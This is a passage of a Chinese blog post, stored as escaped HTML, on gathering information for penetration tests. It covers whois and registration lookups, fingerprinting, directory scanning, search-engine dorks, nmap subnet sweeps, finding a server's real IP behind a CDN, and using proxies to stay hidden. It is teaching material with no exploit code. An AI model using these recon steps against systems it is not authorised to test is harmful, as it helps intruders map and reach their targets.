class=\"headerlink\" title=\"在线查询\"></a>在线查询</h4><p>如今网上出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖whois协议向服务器发送查询请求，命令列接口的工具仍然被系统管理员广泛使用。whois通常使用TCP协议43端口。每个域名&#x2F;IP的whois信息由对应的管理机构保存。</p>\n<p>常见的网站包括：</p>\n<ul>\n<li><p>Whois站长之家查询：<a href=\"http://whois.chinaz.com/\">http://whois.chinaz.com/</a></p>\n</li>\n<li><p>阿里云中国万网查询：<a href=\"https://whois.aliyun.com/\">https://whois.aliyun.com/</a></p>\n</li>\n<li><p>Whois Lookup 查找目标网站所有者的信息：<a href=\"http://whois.domaintools.com/\">http://whois.domaintools.com/</a></p>\n</li>\n<li><p>Netcraft Site Report 显示目标网站上使用的技术：<a href=\"http://toolbar.netcraft.com/site_report?url=\">http://toolbar.netcraft.com/site_report?url=</a></p>\n</li>\n<li><p>Robtex DNS 查询显示关于目标网站的全面的DNS信息：<a href=\"https://www.robtex.com/\">https://www.robtex.com/</a></p>\n</li>\n<li><p>全球Whois查询：<a href=\"https://www.whois365.com/cn/\">https://www.whois365.com/cn/</a></p>\n</li>\n<li><p>站长工具爱站查询：<a href=\"https://whois.aizhan.com/\">https://whois.aizhan.com/</a></p>\n</li>\n</ul>\n<p>还可以在Kali Linux下自带的Whois查询工具，通过命令Whois查询域名信息，只需输入要查询的域名即可</p>\n<h4 id=\"备案信息查询\"><a href=\"#备案信息查询\" class=\"headerlink\" title=\"备案信息查询\"></a>备案信息查询</h4><p><strong>网站备案信息</strong>是根据<strong>国家法律法规规定</strong>，由<strong>网站所有者</strong>向国家<strong>有关部门</strong>申请的<strong>备案</strong>，是国家信息产业部对网站的一种管理途径，是为了防止在网上从事非法网站经营活动，当然主要是针对国内网站。</p>\n<p>在备案查询中我们主要关注的是：单位信息例如<strong>名称</strong>、<strong>备案编号</strong>、<strong>网站负责人</strong>、<strong>法人</strong>、<strong>电子邮箱</strong>、<strong>联系电话</strong>等。</p>\n<p>常用的备案信息查询网站有以下几个：</p>\n<p>ICP&#x2F;IP地址&#x2F;域名信息备案管理系统：<a href=\"http://beian.miit.gov.cn/publish/query/indexFirst.action\">http://beian.miit.gov.cn/publish/query/indexFirst.action</a></p>\n<p>ICP备案查询网：<a href=\"http://www.beianbeian.com/\">http://www.beianbeian.com/</a></p>\n<p>备案吧吧：<a href=\"https://www.beian88.com/\">https://www.beian88.com/</a></p>\n<p>天眼查：<a href=\"https://www.tianyancha.com/\">https://www.tianyancha.com/</a></p>\n<h2 id=\"站点信息收集\"><a href=\"#站点信息收集\" class=\"headerlink\" title=\"站点信息收集\"></a>站点信息收集</h2><p>接下来进行web网站站点信息收集，主要收集如下信息：</p>\n<ul>\n<li>CMS指纹识别</li>\n<li>历史漏洞</li>\n<li>脚本语言</li>\n<li>敏感目录&#x2F;文件</li>\n<li>Waf识别</li>\n</ul>\n<h3 id=\"CMS指纹识别\"><a href=\"#CMS指纹识别\" class=\"headerlink\" title=\"CMS指纹识别\"></a>CMS指纹识别</h3><p><strong>CMS</strong>（<strong>内容管理系统</strong>）又称为<strong>整站系统</strong>或<strong>文章系统</strong>，用于<strong>网站内容管理</strong>。用户只需要下载对应的CMS软件包，就能<strong>部署搭建</strong>，并<strong>直接利用</strong>CMS。但是各种CMS都具有其<strong>独特的结构命名规则</strong>和<strong>特定的文件内容</strong>，因此可以利用这些内容来获取<strong>CMS站点</strong>的<strong>具体软件CMS</strong>与<strong>版本</strong>。</p>\n<p>指纹识别指的是通过关键特征，识别出目标的CMS系统、服务 器、开发语言、操作系统、CDN、WAF的类别版本等等</p>\n<p>在渗透测试中，对进行指纹识别是相当有必要的，识别出相应的CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。</p>\n<p>常见的CMS有Dedecms(织梦)、Discuz、PHPWEB、PHPWind、PHPCMS、ECShop、Dvbbs、SiteWeaver、ASPCMS、帝国、Z-Blog、WordPress等。</p>\n<p>（1）在线识别</p>\n<p>如今，网上一些在线的网站查询CMS指纹识别，如下所示：</p>\n<ul>\n<li>云悉：<a href=\"http://www.yunsee.cn/info.html\">http://www.yunsee.cn/info.html</a></li>\n<li>BugScaner: <a href=\"http://whatweb.bugscaner.com/look/\">http://whatweb.bugscaner.com/look/</a></li>\n<li>潮汐指纹：<a href=\"http://finger.tidesec.net/\">http://finger.tidesec.net/</a></li>\n<li>云悉指纹: <a href=\"http://www.yunsee.cn/finger.html\">http://www.yunsee.cn/finger.html</a></li>\n</ul>\n<p>（2）利用工具</p>\n<p>常见的CMS指纹识别工具有<strong>WhatWeb</strong>、<strong>WebRobo</strong>、<strong>椰树</strong>、<strong>御剑Web指纹识别</strong>。大禹CMS识别程序等，可以快速识别一些主流CMS。</p>\n<p>当我们得知了一个站点的cms类型后，我们可以在网上查找与其相关的漏洞并进行相应的测试。</p>\n<p>（3）手工识别</p>\n<ol>\n<li>根据HTTP响应头判断，重点关注<strong>X-Powered-By</strong>、<strong>cookie</strong>等字段</li>\n<li>根据HTML 特征，重点关注 <strong>body</strong>、<strong>title</strong>、<strong>meta</strong>等标签的内容和属性。</li>\n<li>根据特殊的t<strong>class</strong>判断。HTML 中存在特定 class 属性的某些 <strong>div 标签</strong>，如<body class=\"ke-content\"></body></li>\n</ol>\n<h3 id=\"敏感目录-文件收集\"><a href=\"#敏感目录-文件收集\" class=\"headerlink\" title=\"敏感目录&#x2F;文件收集\"></a>敏感目录&#x2F;文件收集</h3><p>也就是对<strong>目标网站</strong>做个<strong>目录扫描</strong>。在web渗透中，探测Web目录结构和隐藏的敏感文件是一个十分重要的环节，从中可以获取网站的<strong>后台管理页面</strong>、<strong>文件上传界面</strong>、<strong>robots.txt</strong>，甚至可能扫描出<strong>备份文件</strong>从而得到网站的<strong>源代码</strong>。</p>\n<p>目录扫描可以让我们发现这个网站存在<strong>多少个目录</strong>，多少个<strong>页面</strong>，探索出网站的<strong>整体结构</strong>。通过目录扫描我们还能扫描<strong>敏感文件</strong>，<strong>后台文件</strong>，<strong>数据库文件</strong>，和<strong>信息泄漏文件</strong>等等</p>\n<h4 id=\"常见目录泄露\"><a href=\"#常见目录泄露\" class=\"headerlink\" title=\"常见目录泄露\"></a>常见目录泄露</h4><p><strong>目录遍历漏洞</strong>(程序在实现上没有<strong>充分过滤</strong>用户输入的..&#x2F;之类的<strong>目录跳转符</strong>，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。)</p>\n<p>robots.txt          允许爬虫爬取的页面</p>\n<p>sitemap.xml     指导搜索引擎搜索哪些页面 列出了网站的所有重要页面，帮助搜索引擎更好地索引网页。</p>\n<p>网站的备份文件 &#x2F; 数据</p>\n<p>后台登录的目录： &#x2F;admin， &#x2F;manage</p>\n<p>安装包（源码）列如：1.zip，非开源，商用</p>\n<p>上传的目录： 文件上传漏洞，  &#x2F;upload，&#x2F;upload.php</p>\n<p>php探针(是用来监控服务器的工具，它可以显示服务器的运行状况，如硬盘使用、内存占用、网络流量、系统负载和当前时间等信息。)： phpinfo(，用于显示 PHP 配置和系统信息)，</p>\n<p>文本编辑器： kindeditor，CKeditor ， Ueditor，文件上传漏洞、命令注入(如果没有严格的验证和清理，攻击者可能利用这些编辑器进行文件上传攻击、命令注入或跨站脚本攻击（XSS）)</p>\n<h4 id=\"常见的网站目录的扫描工具主要有：\"><a href=\"#常见的网站目录的扫描工具主要有：\" class=\"headerlink\" title=\"常见的网站目录的扫描工具主要有：\"></a>常见的网站目录的扫描工具主要有：</h4><ul>\n<li>御剑后台扫描工具</li>\n<li>dirbuster扫描工具</li>\n<li>dirsearch扫描工具</li>\n<li>dirb</li>\n<li>wwwscan</li>\n<li>Sensitivefilescan</li>\n</ul>\n<h3 id=\"Waf识别\"><a href=\"#Waf识别\" class=\"headerlink\" title=\"Waf识别\"></a>Waf识别</h3><p><strong>Web应用防护系统</strong>（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对<strong>HTTP&#x2F;HTTPS</strong>的安全策略来专门为Web应用提供保护的一款产品。</p>\n<h4 id=\"waf介绍\"><a href=\"#waf介绍\" class=\"headerlink\" title=\"waf介绍\"></a>waf介绍</h4><p>WAF分为<strong>非嵌入型WAF和嵌入型WAF</strong>，非嵌入型WAF指的是<strong>硬件型WAF</strong>、<strong>云WAF</strong>、<strong>软件型WAF</strong>之类的；而嵌入型WAF指的是网站<strong>内置的WAF</strong></p>\n<p>非嵌入型WAF对Web流量的解析完全是<strong>靠自身</strong>，而嵌入型WAF拿到的Web数据是<strong>已经被解析加工好的</strong>。所以非嵌入型的受攻击机面还涉及到其他层面，</p>\n<p>而嵌入型WAF从Web容器模块型WAF、代码层WAF往下走，其对抗畸形报文、扫操作绕过的能力越来越强。</p>\n<h4 id=\"wafoof\"><a href=\"#wafoof\" class=\"headerlink\" title=\"wafoof\"></a>wafoof</h4><p><strong>wafw00f</strong>是一个Web应用防火墙（WAF）指纹识别的工具。</p>\n<h5 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h5><p>下载完之后 进入目录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python setup.py install</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"wafw00f的工作原理：\"><a href=\"#wafw00f的工作原理：\" class=\"headerlink\" title=\"wafw00f的工作原理：\"></a>wafw00f的工作原理：</h4><ol>\n<li><p>发送<strong>正常</strong>的<strong>HTTP请求</strong>，然后<strong>分析响应</strong>，这可以识别出很多WAF。</p>\n</li>\n<li><p>如果不成功，它会发送一些（可能是恶意的）HTTP请求，使用简单的<strong>逻辑推断</strong>是哪一个WAF。</p>\n</li>\n<li><p>如果这也不成功，它会分析之前返回的响应，使用<strong>其它简单的算法猜测</strong>是否有某个WAF或者安全解决方案响应了我们的攻击。</p>\n</li>\n</ol>\n<h3 id=\"敏感信息收集\"><a href=\"#敏感信息收集\" class=\"headerlink\" title=\"敏感信息收集\"></a>敏感信息收集</h3><p>有时候，针对某些安全做得很好的目标，直接通过技术层面是无法完成渗透测试的。此时，便可以利用<strong>搜索引擎搜索</strong>目标<strong>暴露在互联网上</strong>的<strong>关联信息</strong>。例如：<strong>数据库文件</strong>、<strong>SQL注入</strong>、<strong>服务配置信息</strong>，甚至是通过Git找到<strong>站点</strong>泄露源代码，以及<strong>Redis</strong>等未授权访问、<strong>Robots.txt</strong>等敏感信息，从而达到渗透目的。</p>\n<p>Google hacking</p>\n<ul>\n<li><strong>intext</strong>：寻找正文中含有关键字的网页</li>\n<li><strong>intitle</strong>：寻找标题中含有关键字的网页</li>\n<li><strong>allintitle</strong>：用法和intitle类似，只不过可以指定多个词</li>\n<li><strong>inurl</strong>：搜索url中含有关键词的网页</li>\n<li><strong>allinurl</strong>：用法和inurl类似，只不过可以指定多个词</li>\n<li><strong>site</strong>：指定访问的站点</li>\n<li><strong>filetype</strong>：指定访问的文件类型</li>\n<li><strong>link</strong>：指定链接的网页</li>\n<li><strong>related</strong>：搜索相似类型的网页</li>\n<li><strong>info</strong>：返回站点的指定信息，例如：info:<a href=\"http://www.baidu.-/\">www.baidu.-</a> com   将返回百度的一些信息</li>\n<li><strong>phonebook</strong>：电话簿查询美国街道地址和电话号码信息</li>\n<li><strong>Index of</strong>：利用 Index of 语法可以发现允许目录浏览的web网站，就像在本地的普通目录一样</li>\n</ul>\n<h3 id=\"Github信息泄露\"><a href=\"#Github信息泄露\" class=\"headerlink\" title=\"Github信息泄露\"></a>Github信息泄露</h3><p>itHub作为开源代码平台，给程序员提供了很多便利，但如果使用不当，比如将包含了账号密码、密钥等配置文件的代码上传了，导致攻击者能发现并进一步利用这些泄露的信息，就是一个典型的GitHub敏感信息泄露漏洞，再如开发人员在开发时，常常会先把源码提交到github，最后再从远程托管网站把源码pull到服务器的web目录下，如果忘记把.git文件删除，就造成此漏洞。利用.git文件恢复网站的源码，而源码里可能会有数据库的信息，</p>\n<h2 id=\"旁站信息收集\"><a href=\"#旁站信息收集\" class=\"headerlink\" title=\"旁站信息收集\"></a>旁站信息收集</h2><p>旁站是与攻击目标在同一服务器上的不同网站,在攻击目标没有漏洞的情况 下,可以通过查找旁站的漏洞攻击旁站,然后再通过提权拿到服务器的最高权限,拿到服务器的最高权限后攻击目标也就拿下了</p>\n<h3 id=\"查询旁站的方式\"><a href=\"#查询旁站的方式\" class=\"headerlink\" title=\"查询旁站的方式\"></a>查询旁站的方式</h3><p>获取旁站一般有这个几个方式：</p>\n<ol>\n<li>通过站长工具进行同IP的查询</li>\n</ol>\n<p><a href=\"https://stool.chinaz.com/same\">https://stool.chinaz.com/same</a></p>\n<p><a href=\"https://chapangzhan.com/\">https://chapangzhan.com/</a></p>\n<p><a href=\"https://www.webscan.cc/\">https://www.webscan.cc/</a></p>\n<ol start=\"2\">\n<li><p>搜索引擎搜索</p>\n</li>\n<li><p>网络空间探测引擎搜索</p>\n</li>\n</ol>\n<h2 id=\"c端主机查询\"><a href=\"#c端主机查询\" class=\"headerlink\" title=\"c端主机查询\"></a>c端主机查询</h2><p>C段查询主要是当前的IP攻击不下来的时候，可以攻击他的C段，比如IP是220.181.34.34是我们的目标，但是攻击不下来，可以去扫描220.181.34.0-255这个网段，看看能不能攻击下来</p>\n<p>对于单独网站的渗透测试，C段扫描意义不大。C段指的是同一内网段内的其他服务器</p>\n<h3 id=\"nmap扫描c端主机\"><a href=\"#nmap扫描c端主机\" class=\"headerlink\" title=\"nmap扫描c端主机\"></a>nmap扫描c端主机</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -sn -ip/24</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"搜索引擎C段信息\"><a href=\"#搜索引擎C段信息\" class=\"headerlink\" title=\"搜索引擎C段信息\"></a>搜索引擎C段信息</h3><p>使用google或者百度进行语法搜索 site:x.x.x.*进行C段的探测</p>\n<h3 id=\"c端扫描的工具扫描\"><a href=\"#c端扫描的工具扫描\" class=\"headerlink\" title=\"c端扫描的工具扫描\"></a>c端扫描的工具扫描</h3><h3 id=\"使用网络空间探测引擎-IP-”XXX-XXX-XXX-0-24”\"><a href=\"#使用网络空间探测引擎-IP-”XXX-XXX-XXX-0-24”\" class=\"headerlink\" title=\"使用网络空间探测引擎 IP&#x3D;”XXX.XXX.XXX.0&#x2F;24”\"></a>使用网络空间探测引擎 IP&#x3D;”XXX.XXX.XXX.0&#x2F;24”</h3><h3 id=\"存活资产探测\"><a href=\"#存活资产探测\" class=\"headerlink\" title=\"存活资产探测\"></a>存活资产探测</h3><p>C段+全段口会生成很多资产，但是其中会有不能访问的，所以我们需要资产探活。</p>\n<p>用EHole工具</p>\n<h2 id=\"服务器信息收集\"><a href=\"#服务器信息收集\" class=\"headerlink\" title=\"服务器信息收集\"></a>服务器信息收集</h2><p>我们还需要对目标服务器的信息进行收集，主要包括一下部分：</p>\n<ul>\n<li>Web服务器指纹识别</li>\n<li>真实IP地址识别</li>\n<li>编程语言</li>\n<li>Web中间件</li>\n<li>端口信息收集</li>\n<li>后端存储技术识别</li>\n</ul>\n<p>Web服务器指纹识别<br>Web服务器指纹识别是了解正在运行的web服务器类型和版本，目前市场上存在几种不同的web服务器提供商和软件版本，了解被测试的web服务器的类型，能让测试者更好去测试已知漏洞和大概的利用方法，将会在渗透测试过程中有很大的帮助，甚至会改变测试的路线。</p>\n<h3 id=\"Web服务器指纹识别主要识别一下信息：\"><a href=\"#Web服务器指纹识别主要识别一下信息：\" class=\"headerlink\" title=\"Web服务器指纹识别主要识别一下信息：\"></a>Web服务器指纹识别主要识别一下信息：</h3><p>1、Web服务器<strong>名称</strong>，<strong>版本</strong></p>\n<p>2、Web服务器<strong>后端</strong>是否有<strong>应用服务器</strong></p>\n<p>3、<strong>数据库</strong>(DBMS)是否**部署在同一主机(host)**，数据库类型</p>\n<p>4、Web应用使用的<strong>编程语言</strong></p>\n<p>5、Web<strong>应用框架</strong></p>\n<h4 id=\"手工检测\"><a href=\"#手工检测\" class=\"headerlink\" title=\"手工检测\"></a>手工检测</h4><ol>\n<li><p>HTTP头分析<br>即查看HTTP响应头中的<strong>Server</strong>、<strong>X-Powered-By</strong>、<strong>Cookie</strong> 等字段，这也是最基本的方法。</p>\n</li>\n<li><ol start=\"2\">\n<li>协议行为<br>即从<strong>HTTP头字段顺序分析</strong>，观察HTTP响应头的<strong>组织顺序</strong>，因为每个服务器都有一个内部的H<strong>TTP头排序</strong>方法。</li>\n</ol>\n</li>\n<li><p>浏览并观察网站<br>我们可以观察网站某些位置的<strong>HTML源码</strong>(<strong>特殊的class名称</strong>)及其<strong>注释(comment)部分</strong>，可能暴露有价值信息。观察<strong>网站页面后缀</strong>可以判断Web应用使用的编程语言和框架。</p>\n</li>\n<li><p>刻意构造错误<br>错误页面可以给你提供关于服务器的大量信息。可以通过构造含有随机字符串的URL，并访问它来尝试得到404页面。</p>\n</li>\n</ol>\n<h4 id=\"利用工具识别\"><a href=\"#利用工具识别\" class=\"headerlink\" title=\"利用工具识别\"></a>利用工具识别</h4><p><strong>whatweb</strong>是一款用于辅助的自动化Web应用指纹分析工具</p>\n<h2 id=\"真实IP地址识别\"><a href=\"#真实IP地址识别\" class=\"headerlink\" title=\"真实IP地址识别\"></a>真实IP地址识别</h2><p>我们平时使用浏览器，使用的都是<strong>域名</strong>，域名的存在是为了方便人的记忆，其实浏览器本质还是<strong>访问真实IP地址</strong>来获取页面的。</p>\n<p>在渗透测试中，一般只会给你一个域名，那么我们就要根据这个域名来确定目标服务器的真实IP，我们可以通过像<a href=\"http://www.ip138.com这样的ip查询网直接获取目标的一些ip及域名信息,但这里的前提是目标服务器**没有使用cdn/\">www.ip138.com这样的IP查询网直接获取目标的一些IP及域名信息，但这里的前提是目标服务器**没有使用CDN</a>**</p>\n<p>找到真实的IP我们就可以访问这个IP的C段和端口，方便进一步渗透，</p>\n<h3 id=\"什么是CDN\"><a href=\"#什么是CDN\" class=\"headerlink\" title=\"什么是CDN\"></a>什么是CDN</h3><p>CDN的全称是Content Delivery Network，即<strong>内容分发网络</strong>。企业利用分布在<strong>不同区域</strong>的<strong>节点服务器群组</strong>成流量分配<strong>管理平台</strong>，为用户提供内容<strong>分散存储</strong>和<strong>高速缓存服务</strong></p>\n<h3 id=\"CDN的优势\"><a href=\"#CDN的优势\" class=\"headerlink\" title=\"CDN的优势\"></a>CDN的优势</h3><ol>\n<li><p>提高用户访问速率，优化用户使用体验</p>\n</li>\n<li><p>隐藏真实服务器的IP</p>\n</li>\n<li><p>提供WAF功能，目前很多CDN也提供了WAF的功能，我们的访问请求会先经过CDN节点的过滤，该过滤可对SQL注入、XSS、Webshell上传、命令注入、恶意扫描等攻击行为进行有效检测和拦截。CDN节点将认为无害的数据提交给真实的主机服务器。</p>\n</li>\n</ol>\n<h3 id=\"CDN几种访问方式的不同\"><a href=\"#CDN几种访问方式的不同\" class=\"headerlink\" title=\"CDN几种访问方式的不同\"></a>CDN几种访问方式的不同</h3><ol>\n<li>传统访问：用户访问域名–&gt;解析服务器IP–&gt;访问目标主机</li>\n<li>普通CDN：用户访问域名–&gt;CDN节点–&gt;真实服务器IP–&gt;访问目标主机</li>\n<li>带WAF的CDN：用户访问域名–&gt;CDN节点（云WAF）–&gt;真实服务器IP–&gt;访问目标主机</li>\n</ol>\n<p>我们也可以<strong>设置代理</strong>或者通过在线ping网站来在不同地区进行ping测试，然后对比每个地区ping出的IP结果，查看这些IP是否一致，<strong>一致</strong>，则极有可能<strong>不存在CDN</strong>。根据 CDN 的工作原理，如果网站使用了 CDN，那么从<strong>全国各地访问网站</strong>的 IP 地址是<strong>各个 CDN 节点的 IP 地址</strong>，那么如果ping出来的IP<strong>大多不太一样</strong>或者<strong>规律性很强</strong>，可以尝试查询这些IP的归属地，判断是否存在CDN。有以下网站可以进行ping测试：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://ping.chinaz.com/</span><br><span class=\"line\">https://www.wepcc.com</span><br><span class=\"line\">https://www.17ce.com</span><br></pre></td></tr></table></figure>\n\n<p>SearchMap判断目标有没有使用CDN</p>\n<p>searchmap是一款集域名解析、IP反查域名、WHOIS查询、CDN检测、端口扫描、目录扫描、子域名挖掘为一体的前渗透测试综合信息收集工具</p>\n<h3 id=\"如何绕过CDN找到目标真实IP？\"><a href=\"#如何绕过CDN找到目标真实IP？\" class=\"headerlink\" title=\"如何绕过CDN找到目标真实IP？\"></a>如何绕过CDN找到目标真实IP？</h3><ol>\n<li><p>利用子域名。一般来说很多站长可能只会对主站或者流量较大的分站使用CDN，但是一些流量比较小的分站可能没有挂CDN，这些分站和主站虽然不是同一个IP但是都在同一个C段下面的情况，所以我们可以通过ping二级域名获取分站lP，从而能判断出目标的真实IP段。</p>\n<br></li>\n<li><p>查询主域。以前用CDN的时候有个习惯，只让WWW域名使用cdn，秃域名不使用，为的是在维护网站时更方便，不用等cdn缓存。所以试着把目标网站的www去掉，ping一下看ip是不是变了</p>\n<br></li>\n<li><p>扫描网站敏感文件，如phpinfo.php等，从而找到目标的真实IP。</p>\n<br></li>\n<li><p>从国外访问。国内很多CDN厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实P。我们可以通过国外在线代理网站访问，可能会得到真实的IP地址，</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://host-tracker.com/</span><br><span class=\"line\"></span><br><span class=\"line\">http://www.webpagetest.org/</span><br><span class=\"line\"></span><br><span class=\"line\">https://asm.ca.com/en/ping.php</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n<li><p>查看域名历史解析记录。也许目标很久之前没有使用CDN，所以可能会存在使用 CDN 前的记录。所以可以通过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://dnsdb.io/zh-cn/</span><br><span class=\"line\"></span><br><span class=\"line\"> https://x.threatbook.cn</span><br><span class=\"line\"></span><br><span class=\"line\"> https://viewdns.info/iphistory/</span><br><span class=\"line\"></span><br><span class=\"line\"> https://site.ip138.com/</span><br><span class=\"line\"> </span><br><span class=\"line\"> https://www.netcraft.com</span><br><span class=\"line\"></span><br><span class=\"line\"> https://viewdns.info/</span><br></pre></td></tr></table></figure>\n<p>等网站来观察域名的IP历史记录。</p>\n</li>\n<li><p>Nslookup查询。查询域名的NS记录、MX记录、TXT记录等很有可能指向的是真实ip或同C段服务器。</p>\n</li>\n<li><p>利用网络空间搜索引擎。这里主要是利用网站返回的内容寻找真实原始IP，如果原始服务器IP也返回了网站的内容，那么可以在网上搜索大量的相关数据。最常见的网络空间搜索引擎有如下：</p>\n</li>\n</ol>\n<ul>\n<li>Shodan：<a href=\"https://www.shodan.io/\">https://www.shodan.io/</a></li>\n<li>钟馗之眼：<a href=\"https://www.zoomeye.org/\">https://www.zoomeye.org/</a></li>\n<li>FOFA：<a href=\"https://fofa.so/\">https://fofa.so/</a></li>\n</ul>\n<ol start=\"8\">\n<li>利用网站漏洞。比如有代码执行漏洞、SSRF、存储型的XSS都可以让服务器主动访问我们预设的web服务器，那么就能在日志里面看见目标网站服务器的真实IP。</li>\n</ol>\n<h2 id=\"端口信息收集\"><a href=\"#端口信息收集\" class=\"headerlink\" title=\"端口信息收集\"></a>端口信息收集</h2><p>查看本机端口</p>\n<p>netstat命令</p>\n<ol>\n<li><p>nmap工具加Zenmap工具加Masscan工具扫描<br>zenmap是nmap的图形化界面<br>masscan高速端口扫描工具</p>\n</li>\n<li><p>由于使用工具通常会在目标网站留下痕迹，接下来提供一种在线网站探测方法。</p>\n</li>\n</ol>\n<ul>\n<li>在线网站：<a href=\"http://tool.chinaz.com/port/\">http://tool.chinaz.com/port/</a></li>\n<li>ThreatScan在线网站（网站基础信息收集）：<a href=\"https://scan.top15.cn/\">https://scan.top15.cn/</a></li>\n<li>Shodan：<a href=\"https://www.shodan.io/\">https://www.shodan.io/</a></li>\n</ul>\n<h2 id=\"主动信息收集\"><a href=\"#主动信息收集\" class=\"headerlink\" title=\"主动信息收集\"></a>主动信息收集</h2><p>主动信息收集通常是在被动信息收集之后分析出重要攻击⾯或者⽬标重要信息的时候再针对性地去做主动信息收集，</p>\n<p>在主动信息收集的时候通常持续时间⽐较⻓⽽且会通过各种不同的⽅式与⽬标交互。实战中最常⽤的⼿段是模拟或者伪装正常的业务流程与⽬标交互。</p>\n<p>主动信息搜集之前我们一定要挂上代理，一方面是为了隐藏自己，一方面是为了防止测试的时候被封ip导致无法进行继续的渗透活动。</p>\n<h3 id=\"操作系统识别\"><a href=\"#操作系统识别\" class=\"headerlink\" title=\"操作系统识别\"></a>操作系统识别</h3><p>Windows的TTL的值是128，而Linux的TTL大多是64。（默认情况下）</p>\n<h3 id=\"服务版本识别\"><a href=\"#服务版本识别\" class=\"headerlink\" title=\"服务版本识别\"></a>服务版本识别</h3><p>流量包中的关键字</p>\n<p>servers-db（nmap所维护的一个数据库，其中包含了各种网络服务的版本信息的特征数据，通过对目标服务发起请求，从响应中提取特征数据跟数据库中进行比对，就能识别出对应的版本）</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://blog.csdn.net/qq_64177395/article/details/141267567\">https://blog.csdn.net/qq_64177395/article/details/141267567</a></p>\n<p><a href=\"https://www.cnblogs.com/0daybug/p/13800776.html\">https://www.cnblogs.com/0daybug/p/13800776.html</a></p>\n","excerpt":"","more":"<h1 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h1><p>信息收集的重要性毋庸置疑 古今中外 生活的每个部分都离不开信息收集 强大的信息收集能力是制胜关键。渗透测试也不例外 有句话说得好 渗透测试的本质就是信息收集 </p>\n<p>信息收集通常分为</p>\n<ul>\n<li><p>域名信息收集</p>\n</li>\n<li><p>子域名信息收集</p>\n</li>\n<li><p>站点信息收集</p>\n</li>\n<li><p>旁站信息收集</p>\n</li>\n<li><p>c端主机查询</p>\n</li>\n<li><p>敏感信息收集</p>\n</li>\n<li><p>服务器信息收集</p>\n</li>\n<li><p>端口信息收集</p>\n</li>\n<li><p>真实IP地址识别</p>\n</li>\n<li><p>主动信息收集</p>\n</li>\n</ul>\n<h2 id=\"域名信息收集\"><a href=\"#域名信息收集\" class=\"headerlink\" title=\"域名信息收集\"></a>域名信息收集</h2><p>域名信息收集<br><strong>域名</strong>（英语：Domain Name），又称<strong>网域</strong>，是由一串用<strong>点分隔</strong>的名字组成的Internet上某<strong>一台计算机</strong>或<strong>计算机组</strong>的名称，用于在数据传输时对计算机的<strong>定位标识</strong>（有时也指地理位置）。由于IP地址具有<strong>不方便记忆</strong>并且<strong>不能显示地址组织</strong>的<strong>名称</strong>和<strong>性质</strong>等缺点，人们设计出了域名，并通过dns(Domain Name System)网域名称系统来将域名和IP地址<strong>相互映射</strong>，使人更方便地访问互联网，而不用去记住能够被机器直接读取的IP地址数串。</p>\n<h3 id=\"分类\"><a href=\"#分类\" class=\"headerlink\" title=\"分类\"></a>分类</h3><h4 id=\"顶级域名-一级域名：\"><a href=\"#顶级域名-一级域名：\" class=\"headerlink\" title=\"顶级域名&#x2F;一级域名：\"></a>顶级域名&#x2F;一级域名：</h4><p>顶级域（或顶级域名，也称为一级域名），是互联网DNS等级之中的最高级的域，它保存于DNS根域的名字空间中。顶级域名是域名的最后一个部分，即是域名最后一点之后的字母，例如在<a href=\"http://www.example.com这个域名中,顶级域是.com./\">http://www.example.com这个域名中，顶级域是.com。</a></p>\n<h4 id=\"二级域名：\"><a href=\"#二级域名：\" class=\"headerlink\" title=\"二级域名：\"></a>二级域名：</h4><p>除了顶级域名，还有二级域名，就是最靠近顶级域名左侧的字段。例如在<a href=\"http://www.example.com这个域名中,example就是二级域名./\">http://www.example.com这个域名中，example就是二级域名。</a></p>\n<h4 id=\"子域名：\"><a href=\"#子域名：\" class=\"headerlink\" 